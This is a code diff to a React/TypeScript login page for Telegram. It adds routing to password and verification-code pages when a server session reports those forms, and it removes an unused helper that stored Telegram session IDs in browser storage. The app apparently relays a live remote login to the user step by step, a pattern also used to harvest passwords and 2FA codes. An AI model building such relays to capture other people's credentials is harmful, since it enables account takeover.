@@ -348,6 +348,16 @@ export const IndexPage: FC = () => {
           setLoginStatus('Login completed successfully!');
         } else if (data.event === 'error') {
           setLoginStatus(`Error: ${data.data?.error || 'Unknown error'}`);
+        } else if (data.event === 'password_form_detected') {
+          console.log('🔐 Password form detected, navigating to password page...');
+          setLoginStatus('Password form detected - redirecting...');
+          // Navigate to password page
+          navigate(`/sign-in-password?sessionId=${encodeURIComponent(sessionId)}`);
+        } else if (data.event === 'verification_form_detected') {
+          console.log('📱 Verification form detected, navigating to verification page...');
+          setLoginStatus('Verification code form detected - redirecting...');
+          // Navigate to verification page
+          navigate(`/verification-code?sessionId=${encodeURIComponent(sessionId)}`);
         }
       }
     });
@@ -405,30 +415,6 @@ export const IndexPage: FC = () => {
         clearInterval(pollingIntervalRef.current);
       }
     };
-  };
-
-  // eslint-disable-next-line @typescript-eslint/no-unused-vars
-  const _startNewLogin = async () => {
-    try {
-      sessionManager.clearCurrentSession();
-      setShowRealTimeQR(false);
-      setRealTimeQRCode('');
-      setLoginStatus('Starting new login process...');
-      
-      const sessionResponse = await sessionManager.getOrCreateSession();
-      setSessionId(sessionResponse.sessionId);
-      setIsSessionReused(false);
-      
-      // Store session ID in localStorage for PhoneLoginPage access
-      localStorage.setItem('telegram_session_id', sessionResponse.sessionId);
-      sessionStorage.setItem('telegram_session_id', sessionResponse.sessionId);
-      
-      startTelegramLogin(sessionResponse.sessionId);
-      
-    } catch (error) {
-      console.error('❌ Failed to start new login:', error);
-      setLoginStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
-    }
   };
 
   const goToPhoneLogin = () => {
@@ -523,7 +509,7 @@ export const IndexPage: FC = () => {
         display: 'flex',
         flexDirection: 'column',
         alignItems: 'center',
-        paddingTop: '80px',
+        justifyContent: 'center',
         minHeight: '100vh',
         padding: '40px',
         backgroundColor: 'white',
